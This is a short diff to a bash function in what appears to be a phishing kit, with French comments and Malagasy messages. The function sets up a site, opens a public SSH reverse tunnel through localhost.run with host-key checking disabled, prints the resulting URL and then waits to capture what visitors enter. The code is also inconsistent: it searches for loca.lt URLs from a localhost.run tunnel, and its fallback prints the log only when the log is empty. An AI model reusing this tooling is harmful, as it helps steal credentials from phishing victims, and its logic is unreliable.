@@ -275,13 +275,27 @@ start_ssh_tunnel() {
     echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Manomboka ny tunnel (Localhost.run)..."
     setup_site
     
-    # Ajout de l'option -N indispensable pour l'arrière-plan
+    # Nettoyage de l'ancien log
+    rm -f .server/ssh.log
+    
+    # Lancement du tunnel SSH en arrière-plan avec -N et nokey
     ssh -o StrictHostKeyChecking=no -N -R 80:127.0.0.1:$PORT nokey@localhost.run > .server/ssh.log 2>&1 &
-    sleep 6
+    
+    echo -e "${RED}[${WHITE}-${RED}]${YELLOW} Miandry ny famoronana ny rohy..."
+    sleep 7
     
     clear; banner_small
     echo -e "${RED}[${WHITE}-${RED}]${GREEN} Rohy azo (URL) :"
-    grep -o "https://[-0-9a-z]*\.loca.lt" .server/ssh.log
+    
+    # Utilisation d'un filtre plus large pour être sûr d'attraper l'URL loca.lt
+    grep -o "https://[a-zA-Z0-9.-]*\.loca\.lt" .server/ssh.log
+    
+    # Si le grep ne trouve rien, on affiche le contenu brut du log pour déboguer
+    if [ ! -s .server/ssh.log ]; then
+        echo -e "${RED}[${WHITE}!${RED}]${RED} Tsy misy ao amin'ny log ny rohy. Jerena ny olana..."
+        cat .server/ssh.log
+    fi
+
     echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Miandry ny fidiran'ny mpampiasa..."
     capture_data
 }
